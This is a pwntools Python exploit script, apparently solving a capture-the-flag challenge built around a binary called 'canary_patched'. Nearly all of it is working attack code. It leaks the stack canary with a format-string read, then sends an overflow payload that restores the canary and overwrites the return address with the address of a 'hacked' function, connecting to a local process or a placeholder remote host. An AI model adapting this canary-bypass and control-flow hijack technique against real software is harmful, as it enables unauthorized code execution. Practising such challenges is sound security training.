#!/usr/bin/env python3

from pwn import *

exe = ELF("./canary_patched")

gdbscript = '''
init-pwndbg
break *0x0804921f
break *0x08049253
break *0x0804925e
canary
continue
'''

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    offset = 64
    r.sendlineafter(b'!', '%{}$p'.format(23).encode())
    r.recvline()
    canary = int(r.recvline().strip(), 16)
    info("Canary = 0x%x (%d)", canary, canary)
    r.sendlineafter(b':P', b'A'*offset + p32(canary) + b'A'*12 + p32(exe.symbols.hacked))

    r.interactive()

if __name__ == "__main__":
    main()
